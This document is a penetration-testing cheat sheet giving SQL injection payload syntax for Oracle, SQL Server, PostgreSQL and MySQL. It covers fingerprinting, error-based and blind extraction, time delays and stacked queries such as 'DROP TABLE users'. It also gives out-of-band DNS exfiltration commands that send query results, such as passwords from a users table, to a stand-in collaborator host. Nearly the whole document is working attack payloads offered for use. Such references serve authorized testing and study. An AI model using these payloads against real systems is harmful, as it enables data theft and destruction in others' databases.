# SQL Injection — DBMS Syntax Reference

The right SQLi payload depends on the backend database. First **fingerprint** the DBMS, then
look up the exact syntax for **Oracle / Microsoft SQL Server / PostgreSQL / MySQL**. This is the
"which syntax do I use" companion to the main **sqli** sheet (find/confirm the injection there,
then come here for the dialect).

Replace `<placeholders>` and `COLLAB` (your Burp Collaborator / OOB domain) with your own values.

---
---

# PART 1 — OVERVIEW (fingerprint + pick your channel)

## Step 0 — Fingerprint the DBMS

Inject a string-concatenation probe — only the matching database returns `foobar` without a
syntax error:

```sql
'foo'||'bar'      → Oracle / PostgreSQL
'foo'+'bar'       → Microsoft SQL Server
'foo' 'bar'       → MySQL (space between the strings)
```

Other tells: **Oracle** needs `FROM dual` on constant selects and has no `information_schema`;
**MySQL** comments need `-- ` (trailing space); only **MSSQL/PG** reliably allow stacked queries.

## Pick your extraction channel (by what the app leaks back)

| The app shows… | Use | Section |
|----------------|-----|---------|
| Query data on the page | UNION (see sqli) / error-based | A, B7 |
| A visible DB error | Error-based | B7 |
| Only true/false difference | Blind — conditional errors/responses | B6 |
| Nothing, but timing differs | Time-based | C9–C10 |
| Nothing at all | Out-of-band DNS | D11–D12 |

> `sqlmap --dbms=<db> --technique=<BEUSTQ>` automates all of this once you know the target.

---
---

# PART 2 — PER-DBMS REFERENCE

## A. Building blocks

### String concatenation

| DBMS | Syntax |
|------|--------|
| Oracle | `'foo'\|\|'bar'` |
| Microsoft | `'foo'+'bar'` |
| PostgreSQL | `'foo'\|\|'bar'` |
| MySQL | `'foo' 'bar'` (space) or `CONCAT('foo','bar')` |

### Substring (1-indexed; all return `ba` from `foobar`)

| DBMS | Syntax |
|------|--------|
| Oracle | `SUBSTR('foobar',4,2)` |
| Microsoft | `SUBSTRING('foobar',4,2)` |
| PostgreSQL | `SUBSTRING('foobar',4,2)` |
| MySQL | `SUBSTRING('foobar',4,2)` |

### Comments

| DBMS | Syntax |
|------|--------|
| Oracle | `--comment` |
| Microsoft | `--comment` · `/*comment*/` |
| PostgreSQL | `--comment` · `/*comment*/` |
| MySQL | `#comment` · `-- comment` (trailing space) · `/*comment*/` |

> In URLs use `-- -` so the required trailing space survives.

### Database version

| DBMS | Syntax |
|------|--------|
| Oracle | `SELECT banner FROM v$version` · `SELECT version FROM v$instance` |
| Microsoft | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

### List tables & columns

| DBMS | Syntax |
|------|--------|
| Oracle | `SELECT * FROM all_tables` · `SELECT * FROM all_tab_columns WHERE table_name='<TABLE>'` |
| Microsoft | `SELECT * FROM information_schema.tables` · `…columns WHERE table_name='<TABLE>'` |
| PostgreSQL | `SELECT * FROM information_schema.tables` · `…columns WHERE table_name='<TABLE>'` |
| MySQL | `SELECT * FROM information_schema.tables` · `…columns WHERE table_name='<TABLE>'` |

> Oracle has no `information_schema` — use the `all_*` / `user_*` dictionary views.

## B. Blind — conditional responses

### Conditional errors (force an error only when the condition is true)

| DBMS | Syntax |
|------|--------|
| Oracle | `SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')` |

Swap `1=1` for your real test, e.g. `SUBSTR((SELECT ...),1,1)='a'`.

### Error-based extraction (secret appears inside a visible DB error)

| DBMS | Syntax |
|------|--------|
| Microsoft | `SELECT 'foo' WHERE 1=(SELECT 'secret')` → *Conversion failed … 'secret' to int* |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` → *invalid input … "secret"* |
| MySQL | `extractvalue(1,concat(0x7e,(SELECT @@version)))` · `updatexml(1,concat(0x7e,(SELECT database())),1)` |
| Oracle | `SELECT to_char((SELECT user FROM dual)) FROM dual` |

> Error text truncates (~32 chars for MySQL `extractvalue`) — pull long values in chunks with
> `SUBSTR`. `0x7e` is a `~` marker to spot your payload.

## C. Stacked queries & time delays

### Batched / stacked queries

| DBMS | Syntax |
|------|--------|
| Oracle | not supported |
| Microsoft | `QUERY-1 ; QUERY-2` (e.g. `1; DROP TABLE users--`) |
| PostgreSQL | `QUERY-1 ; QUERY-2` |
| MySQL | `QUERY-1 ; QUERY-2` (rarely usable — most drivers send one statement) |

### Time delays (unconditional — proves your code ran)

| DBMS | Syntax |
|------|--------|
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

### Conditional time delays (blind extraction via response time)

| DBMS | Syntax |
|------|--------|
| Oracle | `SELECT CASE WHEN (1=1) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft | `IF (1=1) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(1=1,SLEEP(10),0)` |

## D. Out-of-band (OOB / DNS)

### DNS lookup (trigger an interaction to your Collaborator)

| DBMS | Syntax |
|------|--------|
| Oracle | `SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://COLLAB/"> %r;]>'),'/l') FROM dual` · legacy `UTL_INADDR.get_host_address('COLLAB')` |
| Microsoft | `exec master..xp_dirtree '//COLLAB/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup COLLAB'` |
| MySQL | `LOAD_FILE('\\\\COLLAB\\a')` · `SELECT ... INTO OUTFILE '\\\\COLLAB\\a'` (Windows only) |

### DNS with data exfiltration (result rides in the subdomain)

| DBMS | Syntax |
|------|--------|
| Oracle | `...xmltype('...http://'\|\|(SELECT <QUERY>)\|\|'.COLLAB/'...)` |
| Microsoft | `declare @p varchar(1024);set @p=(SELECT <QUERY>);exec('master..xp_dirtree "//'+@p+'.COLLAB/a"')` |
| PostgreSQL | plpgsql function → `copy … to program 'nslookup '\|\|c\|\|'.COLLAB'` |
| MySQL | `SELECT <QUERY> INTO OUTFILE '\\\\'\|\|(<QUERY>)\|\|'.COLLAB\\a'` (Windows only) |

`<QUERY>` = a scalar SELECT, e.g. `SELECT password FROM users LIMIT 1`. DNS labels max 63 chars
and drop dots/specials — hex/base-encode long or binary values and split across labels.

---

**Key idea:** SQLi payloads are dialect-specific — the same goal (read the version, dump a table,
delay the response, phone home over DNS) needs different syntax on Oracle vs MSSQL vs PostgreSQL
vs MySQL. Fingerprint first (string-concatenation behaviour is the fastest tell), then grab the
matching row. Pick your channel by what the app leaks back: data on the page → UNION / error-based;
only true/false or timing → blind; nothing at all → out-of-band DNS.
